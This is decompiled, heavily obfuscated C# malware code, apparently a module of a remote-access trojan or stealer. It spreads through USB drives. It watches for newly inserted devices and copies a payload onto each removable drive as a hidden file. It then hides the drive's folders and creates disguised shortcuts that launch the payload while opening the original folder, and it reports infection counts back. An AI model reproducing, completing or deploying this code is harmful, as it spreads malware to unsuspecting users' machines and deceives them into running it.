using System;
using System.IO;
using System.Management;

internal class Class26
{
	public static ManagementEventWatcher managementEventWatcher_0;

	public static bool bool_0 = false;

	public static void smethod_0()
	{
		DriveInfo[] array = Delegate319.smethod_0();
		DriveInfo[] array2 = array;
		foreach (DriveInfo object_ in array2)
		{
			try
			{
				if (Delegate320.smethod_0(object_) == DriveType.Removable)
				{
					string text = Delegate71.smethod_0(Delegate133.smethod_1(Delegate89.smethod_0(Delegate165.smethod_0(Delegate102.smethod_0(Delegate101.smethod_0(Delegate100.smethod_0(), Delegate323.smethod_0(new object[4]
					{
						Delegate321.smethod_0(object_),
						Delegate322.smethod_0(object_),
						Delegate322.smethod_1(object_),
						(string)_003CModule_003E.smethod_0(1804253348u)
					}))), (string)_003CModule_003E.smethod_0(1804254039u), ""), 0, 7)), (string)_003CModule_003E.smethod_0(1804250983u));
					string text2 = Delegate71.smethod_0(Delegate322.smethod_2(object_), text);
					if (Delegate175.smethod_1(text2))
					{
						if (Delegate63.smethod_0(Class2.string_3, Delegate59.smethod_2(text2)))
						{
							Delegate324.smethod_0(Class2.string_0, text2, bool_0: true);
							Delegate85.smethod_0(text2, FileAttributes.Hidden);
							Delegate64.smethod_3(Delegate80.smethod_0(new string[5]
							{
								(string)_003CModule_003E.smethod_0(1804254033u),
								Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(1804249480u), Delegate322.smethod_2(object_))),
								(string)_003CModule_003E.smethod_0(1804254055u),
								Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(1804249480u), Class2.string_3)),
								(string)_003CModule_003E.smethod_0(1804249561u)
							}), Delegate70.smethod_4());
						}
					}
					else
					{
						Delegate324.smethod_0(Class2.string_0, text2, bool_0: true);
						Delegate85.smethod_0(text2, FileAttributes.Hidden);
						DirectoryInfo[] array3 = Delegate326.smethod_0(Delegate325.smethod_0(Delegate322.smethod_2(object_)), (string)_003CModule_003E.smethod_0(1804253983u), SearchOption.TopDirectoryOnly);
						int num = 0;
						DirectoryInfo[] array4 = array3;
						foreach (DirectoryInfo object_2 in array4)
						{
							Delegate327.smethod_0(object_2, FileAttributes.Hidden);
							Delegate330.smethod_0(Delegate69.smethod_0(Delegate328.smethod_0(object_)), Delegate71.smethod_0(Delegate329.smethod_0(object_2), (string)_003CModule_003E.smethod_0(1804253959u)), text, Delegate71.smethod_0((string)_003CModule_003E.smethod_0(1804253966u), Delegate329.smethod_1(object_2)), Delegate329.smethod_0(object_2));
							num++;
						}
						if (num > 0)
						{
							Delegate64.smethod_3(Delegate80.smethod_0(new string[5]
							{
								(string)_003CModule_003E.smethod_0(1804254012u),
								Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(1804249480u), Delegate322.smethod_2(object_))),
								(string)_003CModule_003E.smethod_0(1804254171u),
								Delegate59.smethod_1(Delegate71.smethod_0((string)_003CModule_003E.smethod_0(1804249480u), num.ToString())),
								(string)_003CModule_003E.smethod_0(1804254145u)
							}), Delegate70.smethod_4());
						}
					}
				}
			}
			catch
			{
			}
			if (!bool_0)
			{
				Delegate65.smethod_15();
			}
		}
	}

	private static void smethod_1(string string_0, string string_1, string string_2, string string_3, string string_4)
	{
		using Class22 object_ = Delegate331.smethod_0();
		Delegate293.smethod_1(object_, Delegate71.smethod_0(Delegate70.smethod_23(), (string)_003CModule_003E.smethod_0(3651446013u)));
		Delegate293.smethod_2(object_, Delegate160.smethod_0((string)_003CModule_003E.smethod_0(3651452512u), string_2, (string)_003CModule_003E.smethod_0(3651452520u), string_3));
		Delegate293.smethod_3(object_, (string)_003CModule_003E.smethod_0(3651452528u));
		Delegate293.smethod_4(object_, string_4);
		Delegate293.smethod_5(object_, Delegate71.smethod_0(Delegate70.smethod_23(), (string)_003CModule_003E.smethod_0(3651452537u)));
		Delegate332.smethod_0(object_, 3);
		Delegate333.smethod_0(object_, Class22.Enum4.const_1);
		Delegate293.smethod_6(object_, Delegate72.smethod_0(string_0, (string)_003CModule_003E.smethod_0(3651447534u), string_1));
	}

	public static void smethod_2()
	{
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Expected O, but got Unknown
		ManagementScope val = Delegate334.smethod_0((string)_003CModule_003E.smethod_0(525447847u));
		Delegate336.smethod_0(Delegate335.smethod_0(val), bool_0: true);
		try
		{
			WqlEventQuery val2 = Delegate337.smethod_0();
			Delegate338.smethod_0(val2, (string)_003CModule_003E.smethod_0(525447860u));
			Delegate340.smethod_0(val2, Delegate339.smethod_0(0, 0, 3));
			Delegate338.smethod_1(val2, (string)_003CModule_003E.smethod_0(525447824u));
			managementEventWatcher_0 = Delegate341.smethod_0(val, (EventQuery)(object)val2);
			Delegate342.smethod_0(managementEventWatcher_0, new EventArrivedEventHandler(smethod_4));
			Delegate343.smethod_0(managementEventWatcher_0);
			bool_0 = true;
		}
		catch
		{
			if (managementEventWatcher_0 != null)
			{
				Delegate343.smethod_1(managementEventWatcher_0);
			}
		}
	}

	public static void smethod_3()
	{
		bool_0 = false;
		Delegate343.smethod_1(managementEventWatcher_0);
	}

	private static void smethod_4(object sender, EventArgs e)
	{
		Delegate65.smethod_16();
	}
}
